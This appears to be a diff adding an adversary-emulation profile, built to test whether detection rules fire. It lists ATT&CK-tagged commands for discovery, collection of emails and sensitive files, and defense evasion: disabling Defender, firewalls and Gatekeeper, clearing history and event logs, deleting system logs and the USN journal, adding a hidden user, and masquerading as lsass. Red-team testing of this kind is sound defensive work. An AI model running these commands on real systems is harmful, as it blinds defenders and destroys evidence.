@@ -1,0 +1,1426 @@
+id: 54dd6d6f-7018-4833-8a97-91a0e350a72f
+name: PoC Attack Quasar
+description: Attacking Mogh2 to Triggers AI Generated Rules
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- bd527b63-9f9e-46e0-9816-b8434d2b8989
+- 6e1a53c0-7352-4899-be35-fa7f364d5722
+- 52177cc1-b9ab-4411-ac21-2eadc4b5d3b8
+- 335cea7b-bec0-48c6-adfb-6066070f5f68
+- e8017c46-acb8-400c-a4b5-b3362b5b5baa
+- 9849d956-37ea-49f2-a8b5-f2ca080b315d
+- 830bb6ed-9594-4817-b1a1-c298c0f9f425
+- b18e8767-b7ea-41a3-8e80-baf65a5ddef5
+- 1f7ff232-ebf8-42bf-a3c4-657855794cfe
+- d69e8660-62c9-431e-87eb-8cf6bd4e35cf
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 43b3754c-def4-4699-a673-1d85648fda6a
+- df94858e92a23d274ac1d70133d9150f
+- b007f6e8-4a87-4440-8888-29ceab047d9b
+- 06d6ac81dae5c0f49dd3d5641eb2c81e
+- e5f9de8f-3df1-4e78-ad92-a784e3f6770d
+- fcf71ee3-d1a9-4136-b919-9e5f6da43608
+- 5b93df032e230056c21a3e57334f77d1
+- 20277ce46ffe7d08083f8b5ca524b317
+- 0424ccb447bfa66b94162266f55ecd52
+- f1222384fe40cc71e7dea9d182014eaf
+- d9c1b1283c1ad6fdda27be021c4737d3
+- 9d2e91b9241ae43b517be2be98bddfd9
+- dedfa0a54c9c13ce5714a0dc2e1f5d1a
+- 18348573c1f989a6cca9e9bf10809700
+- a9c0234156994cab384418b43da52da4
+- d5ac8f5ec45224dc36453a9490845f23
+- 80e752c5fc69a56ccb86bc90efc5eff6
+- 8478297ebb155b34c412a0fde335eccd
+- 683115a2ceeb045e6ffbf4487322b220
+- 8a60db80ab6f4a6b1db758c95bacfafa
+- 0aaebed766f7120873d5ad90c23355f8
+- 854e480af3b5e2946bb3ae44916e951a
+- 2929fac2296bf1041ba33c86d42d9a5a
+- c8e46a29cac614806da56b0be6b0e454
+- 8e7c28877a9c7826fece190f185b534c
+- 23dafb943f2f1a3e21e8204826c7b271
+- 379509c4b83f252bc779446f0512e936
+- 80be956df11e4a384333150807c3ccd9
+- d38cba2905e62b4c1a7e5c88137ce485
+- 326a9797b0d59b8f6d5a3c384c564b9f
+- 5ffa5b3b330848d39dc1728365dad61c
+- db8c6ba84f796a2f1fa1497b8dc1aae2
+- 4d4b29abb6b1e580e33c0035c1fc37ad
+- 93127a8c6cdb05fd84f871a5faa9d7c7
+- c0da588f-79f0-4263-8998-7496b1a40596
+- c1cd6388-3ced-48c7-a511-0434c6ba8f48
+- feaced8f-f43f-452a-9500-a5219488abb8
+- b6f545ef-f802-4537-b59d-2cb19831c8ed
+- 3b5db901-2cb8-4df7-8043-c4628a6a5d5a
+- 530e47c6-8592-42bf-91df-c59ffbd8541b
+- 26c8b8b5-7b5b-4de1-a128-7d37fb14f517
+- 2dece965-37a0-4f70-a391-0f30e3331aba
+- 5c4dd985-89e3-4590-9b57-71fed66ff4e2
+- 8c06ebf8-bacf-486b-bd77-21ba8c5a5777
+- ce485320-41a4-42e8-a510-f5a8fe96a644
+- b007fc38-9eb7-4320-92b3-9a3ad3e6ec25
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- c0da588f-79f0-4263-8998-7496b1a40596
+- c1cd6388-3ced-48c7-a511-0434c6ba8f48
+- feaced8f-f43f-452a-9500-a5219488abb8
+- b6f545ef-f802-4537-b59d-2cb19831c8ed
+- 3b5db901-2cb8-4df7-8043-c4628a6a5d5a
+- 530e47c6-8592-42bf-91df-c59ffbd8541b
+- 26c8b8b5-7b5b-4de1-a128-7d37fb14f517
+- 2dece965-37a0-4f70-a391-0f30e3331aba
+- 5c4dd985-89e3-4590-9b57-71fed66ff4e2
+- 8c06ebf8-bacf-486b-bd77-21ba8c5a5777
+- ce485320-41a4-42e8-a510-f5a8fe96a644
+- b007fc38-9eb7-4320-92b3-9a3ad3e6ec25
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 4e97e699-93d7-4040-b5a3-2e906a58199e
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+- 316251ed-6a28-4013-812b-ddf5b5b007f8
+- b007fe0c-c6b0-4fda-915c-255bbc070de2
+- b007fc38-9eb7-4320-92b3-9a3ad3e6ec25
+- 78524da1-f347-4fbb-9295-209f1f408330
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 4e97e699-93d7-4040-b5a3-2e906a58199e
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 2dece965-37a0-4f70-a391-0f30e3331aba
+- 9a30740d-3aa8-4c23-8efa-d51215e8a5b9
+- a0676fe1-cd52-482e-8dde-349b73f9aa69
+- 1b4fb81c-8090-426c-93ab-0a633e7a16a7
+- de52784d-4de6-4d4e-b79e-e7b68fe037fb
+- 316251ed-6a28-4013-812b-ddf5b5b007f8
+- b007fe0c-c6b0-4fda-915c-255bbc070de2
+- b007fc38-9eb7-4320-92b3-9a3ad3e6ec25
+- 78524da1-f347-4fbb-9295-209f1f408330
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 4e97e699-93d7-4040-b5a3-2e906a58199e
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 2dece965-37a0-4f70-a391-0f30e3331aba
+- 9a30740d-3aa8-4c23-8efa-d51215e8a5b9
+- a0676fe1-cd52-482e-8dde-349b73f9aa69
+- 1b4fb81c-8090-426c-93ab-0a633e7a16a7
+- de52784d-4de6-4d4e-b79e-e7b68fe037fb
+- 356d1722-7784-40c4-822b-0cf864b0b36d
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 4e97e699-93d7-4040-b5a3-2e906a58199e
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+- 02de522f-7e0a-4544-8afc-0c195f400f5f
+- 422526ec-27e9-429a-995b-c686a29561a4
+- 85341c8c-4ecb-4579-8f53-43e3e91d7617
+- baac2c6d-4652-4b7e-ab0a-f1bf246edd12
+- fdf8bf36-797f-4157-805b-fe7c1c6fc903
+- fa4ed735-7006-4451-a578-b516f80e559f
+- aa6ec4dd-db09-4925-b9b9-43adeb154686
+- 65048ec1-f7ca-49d3-9410-10813e472b30
+- 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
+- ece5dde3-d370-4c20-b213-a1f424aa8d03
+- 41bb2b7a-75af-49fd-bd15-6c827df25921
+- 10a9d979-e342-418a-a9b0-002c483e0fa6
+abilities:
+ bd527b63-9f9e-46e0-9816-b8434d2b8989:
+  name:  Current User
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       whoami
+   - sh:
+     platform: linux
+     command: |
+       whoami
+   - psh:
+     platform: windows
+     command: |
+       whoami
+ 6e1a53c0-7352-4899-be35-fa7f364d5722:
+  name:  Print Working Directory
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       pwd
+   - sh:
+     platform: linux
+     command: |
+       pwd
+   - psh:
+     platform: windows
+     command: |
+       pwd
+ 52177cc1-b9ab-4411-ac21-2eadc4b5d3b8:
+  name:  List Directory
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ls
+   - sh:
+     platform: linux
+     command: |
+       ls
+   - psh:
+     platform: windows
+     command: |
+       dir
+ 335cea7b-bec0-48c6-adfb-6066070f5f68:
+  name:  View Processes
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ps
+   - sh:
+     platform: linux
+     command: |
+       ps
+   - psh:
+     platform: windows
+     command: |
+       get-process
+ e8017c46-acb8-400c-a4b5-b3362b5b5baa:
+  name:  Network Interface Configuration
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       sudo ifconfig
+   - sh:
+     platform: linux
+     command: |
+       sudo ifconfig
+   - psh:
+     platform: windows
+     command: |
+       ipconfig
+ 9849d956-37ea-49f2-a8b5-f2ca080b315d:
+  name:  Check Go
+  tactic:  discovery
+  technique_name:  "Software Discovery"
+  technique_id:  T1518
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       which go
+   - sh:
+     platform: linux
+     command: |
+       which go
+ 830bb6ed-9594-4817-b1a1-c298c0f9f425:
+  name:  Check Chrome
+  tactic:  discovery
+  technique_name:  "Software Discovery"
+  technique_id:  T1518
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       which google-chrome
+   - sh:
+     platform: linux
+     command: |
+       which google-chrome
+ b18e8767-b7ea-41a3-8e80-baf65a5ddef5:
+  name:  Check Python
+  tactic:  discovery
+  technique_name:  "Software Discovery"
+  technique_id:  T1518
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       python3 --version;python2 --version;python --version
+   - sh:
+     platform: linux
+     command: |
+       python3 --version;python2 --version;python --version
+   - cmd:
+     platform: windows
+     command: |
+       python3 --version&python2 --version&python --version
+ 1f7ff232-ebf8-42bf-a3c4-657855794cfe:
+  name:  Find company emails
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o "\b[A-Za-z0-9._%+-]+@#{target.org.name}\b" 2>/dev/null {} \;
+ d69e8660-62c9-431e-87eb-8cf6bd4e35cf:
+  name:  Find IP addresses
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o "(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" 2>/dev/null {} \;
+ 90c2efaa-8205-480d-8bb6-61d90dbaf81b:
+  name:  Find files
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+   - psh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - pwsh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - sh:
+     platform: linux
+     command: |
+       find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+ 6469befa-748a-4b9c-a96d-f191fde47d89:
+  name:  Create staging directory
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       mkdir -p staged && echo $PWD/staged
+   - sh:
+     platform: linux
+     command: |
+       mkdir -p staged && echo $PWD/staged
+   - psh:
+     platform: windows
+     command: |
+       New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
+   - pwsh:
+     platform: windows
+     command: |
+       New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
+
+ 43b3754c-def4-4699-a673-1d85648fda6a:
+  name:  Avoid logs
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Command History"
+  technique_id:  T1070.003
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       > $HOME/.bash_history && unset HISTFILE
+   - sh:
+     platform: linux
+     command: |
+       > $HOME/.bash_history && unset HISTFILE
+   - psh:
+     platform: windows
+     command: |
+       Clear-History;Clear
+ df94858e92a23d274ac1d70133d9150f:
+  name:  Prevent Powershell History Logging
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Command History"
+  technique_id:  T1070.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-PSReadlineOption -HistorySaveStyle SaveNothing
+ b007f6e8-4a87-4440-8888-29ceab047d9b:
+  name:  Disable Windows Defender All
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-MpPreference -DisableIntrusionPreventionSystem $true;
+       Set-MpPreference -DisableIOAVProtection $true;
+       Set-MpPreference -DisableRealtimeMonitoring $true;
+       Set-MpPreference -DisableScriptScanning $true;
+       Set-MpPreference -EnableControlledFolderAccess Disabled;
+ 06d6ac81dae5c0f49dd3d5641eb2c81e:
+  name:  Grant Full Access to folder for Everyone - Ryuk Ransomware Style
+  tactic:  defense-evasion
+  technique_name:  "File and Directory Permissions Modification: Windows File and Directory Permissions Modification"
+  technique_id:  T1222.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
+ e5f9de8f-3df1-4e78-ad92-a784e3f6770d:
+  name:  Move Powershell & triage
+  tactic:  defense-evasion
+  technique_name:  "PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;
+       C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;
+       C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;
+       C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;
+       C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;
+ fcf71ee3-d1a9-4136-b919-9e5f6da43608:
+  name:  Clear Logs (2)
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Windows Event Logs"
+  technique_id:  T1070.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Clear-Eventlog Security;
+       Clear-Eventlog System;
+   - pwsh:
+     platform: windows
+     command: |
+       Clear-Eventlog Security;
+       Clear-Eventlog System;
+ 5b93df032e230056c21a3e57334f77d1:
+  name:  Disable Microsoft Defender Firewall
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
+  technique_id:  T1562.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netsh advfirewall set currentprofile state off
+ 20277ce46ffe7d08083f8b5ca524b317:
+  name:  Create Windows Hidden File with Attrib
+  tactic:  defense-evasion
+  technique_name:  "Hide Artifacts: Hidden Files and Directories"
+  technique_id:  T1564.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       attrib.exe +h %temp%\T1564.001.txt
+ 0424ccb447bfa66b94162266f55ecd52:
+  name:  Change Powershell Execution Policy to Bypass
+  tactic:  defense-evasion
+  technique_name:  "Modify Registry"
+  technique_id:  T1112
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
+ f1222384fe40cc71e7dea9d182014eaf:
+  name:  Hidden Window
+  tactic:  defense-evasion
+  technique_name:  "Hide Artifacts: Hidden Window"
+  technique_id:  T1564.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Start-Process powershell.exe -WindowStyle hidden calc.exe
+ d9c1b1283c1ad6fdda27be021c4737d3:
+  name:  Masquerading - non-windows exe running as windows exe
+  tactic:  defense-evasion
+  technique_name:  "Masquerading: Rename System Utilities"
+  technique_id:  T1036.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       copy "1db90b_T1036.003.exe" ($env:TEMP + "\svchost.exe"); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003
+ 9d2e91b9241ae43b517be2be98bddfd9:
+  name:  Indicator Removal using FSUtil
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host"
+  technique_id:  T1070
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       fsutil usn deletejournal /D C:
+ dedfa0a54c9c13ce5714a0dc2e1f5d1a:
+  name:  Create a Hidden User Called "$"
+  tactic:  defense-evasion
+  technique_name:  "Hide Artifacts"
+  technique_id:  T1564
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user $ ATOMIC123! /add /active:yes
+ 18348573c1f989a6cca9e9bf10809700:
+  name:  Malicious process Masquerading as LSM.exe
+  tactic:  defense-evasion
+  technique_name:  "Masquerading: Rename System Utilities"
+  technique_id:  T1036.003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
+ a9c0234156994cab384418b43da52da4:
+  name:  Rundll32 setupapi.dll Execution
+  tactic:  defense-evasion
+  technique_name:  "Signed Binary Proxy Execution: Rundll32"
+  technique_id:  T1218.011
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "4c870d_T1218.011_DefaultInstall.inf"
+ d5ac8f5ec45224dc36453a9490845f23:
+  name:  Masquerading as Windows LSASS process
+  tactic:  defense-evasion
+  technique_name:  "Masquerading: Rename System Utilities"
+  technique_id:  T1036.003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B
+ 80e752c5fc69a56ccb86bc90efc5eff6:
+  name:  Read volume boot sector via DOS device path (PowerShell)
+  tactic:  defense-evasion
+  technique_name:  "Direct Volume Access"
+  technique_id:  T1006
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer
+ 8478297ebb155b34c412a0fde335eccd:
+  name:  Stop/Start UFW firewall
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
+  technique_id:  T1562.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       ufw disable
+ 683115a2ceeb045e6ffbf4487322b220:
+  name:  Edit UFW firewall sysctl.conf file
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
+  technique_id:  T1562.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf; grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+ 8a60db80ab6f4a6b1db758c95bacfafa:
+  name:  Edit UFW firewall ufw.conf file
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
+  technique_id:  T1562.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf; grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
+ 0aaebed766f7120873d5ad90c23355f8:
+  name:  Overwrite Linux Mail Spool
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs"
+  technique_id:  T1070.002
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo 0> /var/spool/mail/root
+ 854e480af3b5e2946bb3ae44916e951a:
+  name:  Disable iptables
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify System Firewall"
+  technique_id:  T1562.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       iptables-save > /tmp/iptables.rules; iptables -F
+ 2929fac2296bf1041ba33c86d42d9a5a:
+  name:  Clear Pagging Cache
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       free && echo 3 > /proc/sys/vm/drop_caches && free; echo 3> /proc/sys/vm/drop_caches
+ c8e46a29cac614806da56b0be6b0e454:
+  name:  Clear Bash history (truncate)
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Command History"
+  technique_id:  T1070.003
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       truncate -s0 ~/.bash_history
+ 8e7c28877a9c7826fece190f185b534c:
+  name:  Use Space Before Command to Avoid Logging to History
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Command History"
+  technique_id:  T1070.003
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       hostname; whoami
+   - sh:
+     platform: linux
+     command: |
+       hostname; whoami
+ 23dafb943f2f1a3e21e8204826c7b271:
+  name:  Execute a process from a directory masquerading as the current parent directory.
+  tactic:  defense-evasion
+  technique_name:  "Masquerading: Match Legitimate Name or Location"
+  technique_id:  T1036.005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
+   - sh:
+     platform: linux
+     command: |
+       mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c "echo Hello from the Atomic Red Team test T1036.005#1"
+ 379509c4b83f252bc779446f0512e936:
+  name:  Create a hidden file in a hidden directory
+  tactic:  defense-evasion
+  technique_name:  "Hide Artifacts: Hidden Files and Directories"
+  technique_id:  T1564.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       mkdir /var/tmp/.hidden-directory; echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
+   - sh:
+     platform: linux
+     command: |
+       mkdir /var/tmp/.hidden-directory; echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
+ 80be956df11e4a384333150807c3ccd9:
+  name:  Decode base64 Data into Script
+  tactic:  defense-evasion
+  technique_name:  "Obfuscated Files or Information"
+  technique_id:  T1027
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       if [ -e "/tmp/encoded.dat" ]; then : ; else if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64encode -r -"; else cmd="base64"; fi; echo "echo Hello from the Atomic Red Team && uname -v" | $cmd > /tmp/encoded.dat; fi;  ;  if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi; cat /tmp/encoded.dat | $cmd > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh
+   - sh:
+     platform: linux
+     command: |
+       if [ -e "/tmp/encoded.dat" ]; then : ; else if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64encode -r -"; else cmd="base64"; fi; echo "echo Hello from the Atomic Red Team && uname -v" | $cmd > /tmp/encoded.dat; fi;  ;  if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi; cat /tmp/encoded.dat | $cmd > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh
+ d38cba2905e62b4c1a7e5c88137ce485:
+  name:  Linux Base64 Encoded Shebang in CLI
+  tactic:  defense-evasion
+  technique_name:  "Deobfuscate/Decode Files or Information"
+  technique_id:  T1140
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash
+   - sh:
+     platform: linux
+     command: |
+       echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash
+ 326a9797b0d59b8f6d5a3c384c564b9f:
+  name:  Base64 decoding with shell utilities
+  tactic:  defense-evasion
+  technique_name:  "Deobfuscate/Decode Files or Information"
+  technique_id:  T1140
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
+   - sh:
+     platform: linux
+     command: |
+       ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
+ 5ffa5b3b330848d39dc1728365dad61c:
+  name:  Set a file's creation timestamp
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Timestomp"
+  technique_id:  T1070.006
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date "$NOW"; stat /tmp/T1070.006-creation.txt
+   - sh:
+     platform: linux
+     command: |
+       NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date "$NOW"; stat /tmp/T1070.006-creation.txt
+ db8c6ba84f796a2f1fa1497b8dc1aae2:
+  name:  Pad Binary to Change Hash using truncate command - Linux/macOS
+  tactic:  defense-evasion
+  technique_name:  "Obfuscated Files or Information: Binary Padding"
+  technique_id:  T1027.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       if [ -f /tmp/evil-binary ]; then : ; else cp /bin/ls /tmp/evil-binary; fi;  ;  truncate -s +1 /tmp/evil-binary
+   - sh:
+     platform: linux
+     command: |
+       if [ -f /tmp/evil-binary ]; then : ; else cp /bin/ls /tmp/evil-binary; fi;  ;  truncate -s +1 /tmp/evil-binary
+ 4d4b29abb6b1e580e33c0035c1fc37ad:
+  name:  rm -rf
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs"
+  technique_id:  T1070.002
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi
+   - sh:
+     platform: linux
+     command: |
+       sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi
+ 93127a8c6cdb05fd84f871a5faa9d7c7:
+  name:  Disable macOS Gatekeeper
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       sudo spctl --master-disable
+
+ c0da588f-79f0-4263-8998-7496b1a40596:
+  name:  Identify active user
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       whoami
